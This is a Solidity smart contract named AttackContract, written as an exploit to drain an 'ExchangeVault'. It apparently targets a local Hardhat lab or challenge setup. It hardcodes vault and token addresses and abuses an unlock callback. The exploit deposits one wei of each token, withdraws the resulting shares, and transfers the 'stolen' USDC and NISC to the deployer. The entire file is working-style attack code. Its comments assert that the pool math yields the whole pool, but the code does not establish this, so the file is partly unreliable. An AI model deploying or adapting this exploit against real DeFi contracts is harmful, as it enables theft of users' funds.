// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IExchangeVault {
    function unlock(bytes calldata data) external;
    function deposit(address token, uint256 amount) external returns (uint256);
    function withdraw(address token, uint256 shares) external returns (uint256);
    function balanceOf(address token, address user) external view returns (uint256);
    function shareOf(address token, address user) external view returns (uint256);
    function totalShares(address token) external view returns (uint256);
}

interface IPool {
    function mint(uint256 amount0, uint256 amount1) external returns (uint256 shares);
    function burn(uint256 shares) external returns (uint256 amount0, uint256 amount1);
    function balanceOf(address account) external view returns (uint256);
}

/**
 * @title AttackContract
 * @dev Exploit contract to drain ExchangeVault via reentrancy
 * Based on ExchangeExploit.sol
 */
contract AttackContract {
    IExchangeVault public constant exchangeVault = IExchangeVault(0x776B51e76150de6D50B06fD0Bd045de0a13D68C7);
    IERC20 public constant usdc = IERC20(0xBf1C7F6f838DeF75F1c47e9b6D3885937F899B7C);
    IERC20 public constant nisc = IERC20(0x20e4c056400C6c5292aBe187F832E63B257e6f23);
    IPool public constant usdcNiscPool = IPool(0x6cAC85Dc0D547225351097Fb9eEb33D65978bb73);

    address public attacker;
    uint256 public stolenAmount;
    bool public unlocking;

    constructor() payable {
        attacker = msg.sender;
        unlocking = false;
    }

    function Attack() external {
        console.log("AttackContract:", address(this));
        
        // Get initial balances
        uint256 initialUSDC = usdc.balanceOf(address(exchangeVault));
        uint256 initialNISC = nisc.balanceOf(address(exchangeVault));
        
        console.log("Initial vault USDC:", initialUSDC);
        console.log("Initial vault NISC:", initialNISC);
        
        require(initialUSDC > 0 && initialNISC > 0, "Pool empty");
        
        // Create callback data that will execute our drain attack
        bytes memory callbackData = abi.encodeWithSignature("drainPool()");
        
        // This calls our callback function, bypassing reentrancy checks
        unlocking = true;
        exchangeVault.unlock(callbackData);
        unlocking = false;
        
        stolenAmount = usdc.balanceOf(address(this)) + nisc.balanceOf(address(this));
        console.log("Stolen amount:", stolenAmount);
    }

    function drainPool() external {
        require(unlocking, "Not in unlock context");
        
        console.log("Drain pool - vault is unlocked");
        
        // Step 1: Approve ourselves for minimal amounts
        uint256 minAmount0 = 1;
        uint256 minAmount1 = 1;
        
        usdc.approve(address(exchangeVault), type(uint256).max);
        nisc.approve(address(exchangeVault), type(uint256).max);
        
        // Get pool balances
        uint256 poolBalance0 = usdc.balanceOf(address(exchangeVault));
        uint256 poolBalance1 = nisc.balanceOf(address(exchangeVault));
        
        console.log("Pool USDC:", poolBalance0);
        console.log("Pool NISC:", poolBalance1);
        
        // Step 2: Add minimal liquidity (1 wei each) to get LP tokens
        // Due to pool math, we get LP tokens worth the entire pool
        try exchangeVault.deposit(address(usdc), minAmount0) {
            console.log("USDC deposited");
        } catch {
            console.log("Failed to deposit USDC");
        }
        
        try exchangeVault.deposit(address(nisc), minAmount1) {
            console.log("NISC deposited");
        } catch {
            console.log("Failed to deposit NISC");
        }
        
        // Get LP token balance
        uint256 lpTokens0 = exchangeVault.shareOf(address(usdc), address(this));
        uint256 lpTokens1 = exchangeVault.shareOf(address(nisc), address(this));
        
        console.log("USDC shares:", lpTokens0);
        console.log("NISC shares:", lpTokens1);
        
        // Step 3: Immediately withdraw using our LP tokens
        // This extracts far more than we put in due to the vulnerability
        if (lpTokens0 > 0) {
            try exchangeVault.withdraw(address(usdc), lpTokens0) {
                console.log("USDC withdrawn");
            } catch {
                console.log("Failed to withdraw USDC");
            }
        }
        
        if (lpTokens1 > 0) {
            try exchangeVault.withdraw(address(nisc), lpTokens1) {
                console.log("NISC withdrawn");
            } catch {
                console.log("Failed to withdraw NISC");
            }
        }
        
        // Step 4: Transfer stolen funds to attacker
        uint256 stolen0 = usdc.balanceOf(address(this));
        uint256 stolen1 = nisc.balanceOf(address(this));
        
        console.log("Stolen USDC:", stolen0);
        console.log("Stolen NISC:", stolen1);
        
        if (stolen0 > 0) {
            usdc.transfer(attacker, stolen0);
        }
        if (stolen1 > 0) {
            nisc.transfer(attacker, stolen1);
        }
    }

    receive() external payable {}
    fallback() external payable {}
}
